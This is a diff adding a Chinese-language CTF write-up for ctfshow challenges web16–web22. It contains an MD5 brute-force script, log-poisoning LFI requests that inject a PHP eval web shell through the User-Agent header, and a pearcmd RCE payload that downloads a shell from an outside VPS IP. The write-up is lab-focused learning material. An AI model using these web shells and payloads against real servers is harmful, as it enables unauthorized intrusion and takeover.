@@ -6324,6 +6324,364 @@ if(isset($_GET['c'])){
 
 ------
 
+### 萌新杯web16
+
+> 阿呆为了自己的梦想(fulage)，决定来一波反向跑路。
+
+靶机的源码如下：
+
+```php
+<?php
+# flag in config.php
+include("config.php");
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(md5("ctfshow$c")==="a6f57ae38a22448c2f07f3f95f49c84e"){
+        echo $flag;
+    }else{
+        echo "nonono!";
+    }
+}else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+看了其他师傅的write up，这道题是`ctfshow`的`36d`梗。
+
+```python
+import hashlib
+
+str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+for i in str1:
+    for j in str1:
+        for k in str1:
+            s = hashlib.md5(('ctfshow'+i+j+k).encode()).hexdigest()
+            #print(type(s))
+            if s=='a6f57ae38a22448c2f07f3f95f49c84e':
+                print(i+j+k)   # 36d
+                break
+```
+
+构造`GET`请求`/?c=36d`。提交`ctfshow{f0285e67-05c1-4276-8a3e-8dbdb3a60e29}`即可。
+
+------
+
+### 萌新杯web17
+
+> 阿呆终于怀揣自己的梦想来到了故土，凭借着高超的系统垃圾清理(rm -rf /*)技术，很快的阿呆找到了一份程序员工作。
+
+靶机的源码如下：
+
+```php
+<?php
+if(isset($_GET['c'])){
+   $c=$_GET['c'];
+   if(!preg_match("/php/i",$c)){
+       include($c);
+   }
+}else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+这段代码存在**本地文件包含**（Local File Inclusion, LFI）漏洞。
+
+编写`PHP`一句话木马，当然也可以使用`system('ls');`和`system('cat 36d.php')`，但是这样需要两次`User-Agent`注入。
+
+```php
+<?php @eval($_POST['shell']);?>
+```
+
+使用`BurpSuite`在请求头信息的`User-Agent`中插入`PHP`一句话木马。
+
+```
+GET /?c=/var/log/nginx/access.log HTTP/1.1
+Host: 71cdfaf5-e8af-422d-a187-6abb6cd66400.challenge.ctf.show
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 <?php @eval($_POST['shell']);?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+```
+
+`BurpSuite`放行后，靶机显示的内容如下：
+
+> 172.12.0.2 - - [22/Jan/2026:11:46:18 +0000] "GET / HTTP/1.1" 200 1450 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36" 172.12.0.2 - - [22/Jan/2026:11:47:46 +0000] "GET /?c=/var/log/nginx/access.log HTTP/1.1" 200 406 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
+
+Web服务器的日志文件内容多了一条访问记录，但没有显示刚刚插入的一句话木马，因为日志文件中的代码会被执行但不会显示。
+
+用`AntSword`连接靶机，打开虚拟终端输入`ls`和`cat 36d.php`拿到`flag`。
+
+```bash
+(*) 基础信息
+当前路径: /var/www/html
+磁盘列表: /
+系统信息: Linux f43739db3a6a 5.4.0-163-generic #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 x86_64
+当前用户: www-data
+(*) 输入 ashelp 查看本地命令
+(www-data:/var/www/html) $ ls
+36d.php
+index.php
+(www-data:/var/www/html) $ cat 36d.php
+<?php
+$flag = "ctfshow{545e4e14-8d7a-48f2-874e-47ed8d366571}";
+?>
+```
+
+提交`ctfshow{545e4e14-8d7a-48f2-874e-47ed8d366571}`即可。
+
+------
+
+### 萌新杯web18
+
+> 阿呆加入了过滤，这下完美了。
+
+靶机的源码如下：
+
+```php
+<?php
+if(isset($_GET['c'])){
+   $c=$_GET['c'];
+   if(!preg_match("/php|file/i",$c)){
+           include($c);
+   }
+}else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+跟上题做法一样，用`BurpSuite`抓包后在请求头信息的`User-Agent`中插入`PHP`一句话木马，再用`AntSword`连接靶机。
+
+```
+GET /?c=/var/log/nginx/access.log HTTP/1.1
+Host: aafe59a9-d2c9-4b02-a188-a4ab8e2f6a9f.challenge.ctf.show
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 <?php @eval($_POST['shell']);?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+```
+
+用`AntSword`连接靶机，通过文件管理直接访问`36d.php`拿到`flag`。
+
+```php
+<?php
+$flag = "ctfshow{5807ed3f-e5e5-4691-951b-ddb957ba0047}";
+?>
+```
+
+提交`ctfshow{5807ed3f-e5e5-4691-951b-ddb957ba0047}`即可。
+
+------
+
+### 萌新杯web19
+
+> 用到了解码？果断禁用base，哼
+
+坏了，看这题目描述，我们之前的求解步骤没按照出题人的思路走。靶机的源码如下：
+
+```php
+<?php
+if(isset($_GET['c'])){
+   $c=$_GET['c'];
+   if(!preg_match("/php|file|base/i",$c)){
+       include($c);
+   }
+}else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+故技重施，`BurpSuite`抓包后在`User-Agent`中插入`PHP`一句话木马，然后用`AntSword`连接靶机。
+
+```
+GET /?c=/var/log/nginx/access.log HTTP/1.1
+Host: 5b14e004-e8af-4925-99c7-ae9bf8c1be5f.challenge.ctf.show
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 <?php @eval($_POST['shell']);?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+```
+
+用`AntSword`连接靶机，通过文件管理直接访问`36d.php`拿到`flag`。
+
+```php
+<?php
+$flag = "ctfshow{aff889cb-2318-46b6-8f67-065a90792042}";
+?>
+```
+
+提交`ctfshow{aff889cb-2318-46b6-8f67-065a90792042}`即可。
+
+------
+
+### 萌新杯web20
+
+> 百密一疏，竟然还有个rot
+
+坏了，看这题目描述，更加确信我们之前的求解步骤没按照出题人的思路走啦。靶机的源码如下：
+
+```php
+<?php
+if(isset($_GET['c'])){
+   $c=$_GET['c'];
+   if(!preg_match("/php|file|base|rot/i",$c)){
+           include($c);
+   }
+}else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+故技重施，`BurpSuite`抓包后在`User-Agent`中插入`PHP`一句话木马，然后用`AntSword`连接靶机。
+
+```
+GET /?c=/var/log/nginx/access.log HTTP/1.1
+Host: 318274c9-cf67-4f09-80dc-54335c9312d6.challenge.ctf.show
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 <?php @eval($_POST['shell']);?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+```
+
+用`AntSword`连接靶机，通过文件管理直接访问`36d.php`拿到`flag`。
+
+```php
+<?php
+$flag = "ctfshow{cb11e188-85f3-490c-8f01-0be714b9faa3}";
+?>
+```
+
+提交`ctfshow{cb11e188-85f3-490c-8f01-0be714b9faa3}`即可。
+
+------
+
+### 萌新杯web21
+
+> 阿呆绝地反击
+
+收手吧阿呆，外面全是~~黑客~~警察。靶机的源码如下：
+
+```php
+<?php
+if(isset($_GET['c'])){
+   $c=$_GET['c'];
+   if(!preg_match("/php|file|\:|base|rot/i",$c)){
+       include($c);
+   }
+}else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+一招鲜吃遍天好吧。`BurpSuite`抓包后在`User-Agent`中插入`PHP`一句话木马，再用`AntSword`连接。
+
+```
+GET /?c=/var/log/nginx/access.log HTTP/1.1
+Host: a989001f-89e1-413e-ae05-052ad5e03e56.challenge.ctf.show
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36  <?php @eval($_POST['shell']);?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+```
+
+用`AntSword`连接靶机，通过文件管理直接访问`36d.php`拿到`flag`。
+
+```php
+<?php
+$flag = "ctfshow{2d3b31b9-9511-4d95-ae0f-a05e522cd4d4}";
+?>
+```
+
+提交`ctfshow{2d3b31b9-9511-4d95-ae0f-a05e522cd4d4}`即可。
+
+------
+
+### 萌新杯web22
+
+> 还能搞，阿呆表示将直播倒立放水。
+
+靶机的源码如下：
+
+```php
+<?php
+if(isset($_GET['c'])){
+   $c=$_GET['c'];
+   if(!preg_match("/\:|\/|\\\/i",$c)){
+           include($c.".php");
+   }
+}else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+靶机的正则表达式过滤了`:`，`/`，`\`，但是`.`依旧是允许的。
+
+我们可以结合`pearcmd`利用链实现远程代码执行（RCE）。
+
+先在Google Cloud启动VPS，然后用`gcloud`连接VPS。
+
+```bash
+gcloud compute ssh --zone "us-west1-a" "ctf-vps" --project "project-ip"
+```
+
+登录进VPS后，先编写`PHP`一句话木马文件`shell.php`。
+
+```php
+<?php @eval($_POST['t0ur1st']);?>
+```
+
+再用`python3 -m http.server 9999`启动一个**只读的静态文件 HTTP 服务器**，它不会执行PHP代码，不用担心我们在写题期间别人通过`AntSword`连接`shell.php`拿下服务器控制权限，因为这只是一个简单的文件共享服务器，当有人访问文件时，它只会原样返回文件的文本内容，并且访问者的IP能被监听到。
+
+因为之前的反弹shell题我是大胆地用博客站的云服务器，所以写Write Up时用VPS-IP指代来隐匿掉真实IP地址。这回是用Google Cloud中专门的`ctf-vps`，所以直接写IP地址也无妨。构造`Payload`如下：
+
+```
+/?c=pearcmd&+download+http://34.83.239.45:9999/shell.php
+```
+
+`PHP`的`$_GET`只解析**标准query string**，`+download+...`被视为一个无效参数名（以 `+` 开头），`PHP`会忽略它，但这并不会影响`$_GET['c']` 的值。实际值`$c = "pearcmd"`与`.php`拼接得到`pearcmd.php`，而`pearcmd.php`是大多数旧版本`PHP`安装时的内置文件。`pearcmd.php` 是一个命令行工具的`Web`封装，但它存在严重的`RCE`漏洞！当靶机执行`include("pearcmd.php");`时，通过某种方式（如参数）触发执行`pear download http://34.83.239.45:9999/shell.php`。靶机的执行结果如下：
+
+```
+downloading shell.php ... Starting to download shell.php (34 bytes) ....done: 34 bytes Could not get contents of package "/var/www/html/shell.php". Invalid tgz file. Download of "http://34.83.239.45:9999/shell.php" succeeded, but it is not a valid package archive Invalid or missing remote package file download failed
+```
+
+不用管这段文字的`Invalid tgz file`和`but`后面内容是啥，因为关键点在于`shell.php`下载成功啦。
+
+下载成功的文件`shell.php` 会被安装到`PEAR`目录（如 `/usr/share/php/`），并且能通过`Web`服务器访问。使用`pearcmd`下载`shell.php`文件时，只是传输源代码的文本内容，一句话木马被写入到了靶机的`shell.php`文件中但并没有执行。所以我们还需要直接访问靶机中新生成的`shell.php`文件，此时服务器会将文件中的`PHP`代码`<?php @eval($_POST['t0ur1st']);?>`解析并执行。
+
+能访问到靶机的`/shell.php`文件后，用`AntSword`连接靶机查看`flag`或者用`HackBar`构造`POST`请求。
+
+用`t0ur1st=system('ls');`可以看到靶机的执行结果如下：
+
+> 36d.php index.php shell.php
+
+用`t0ur1st=system('tac 36d.php');`查看文件内容可以看到`flag`。
+
+```
+?> $flag = "ctfshow{d592793d-bae8-46a6-a40d-5cbe7e9ad668}";
+```
+
+提交`ctfshow{d592793d-bae8-46a6-a40d-5cbe7e9ad668}`即可。
+
+------
+
 ### 获得百分之百的快乐
 
 > 阿呆开发了自己的博客系统，准备对欺负他的大佬口吐芬芳
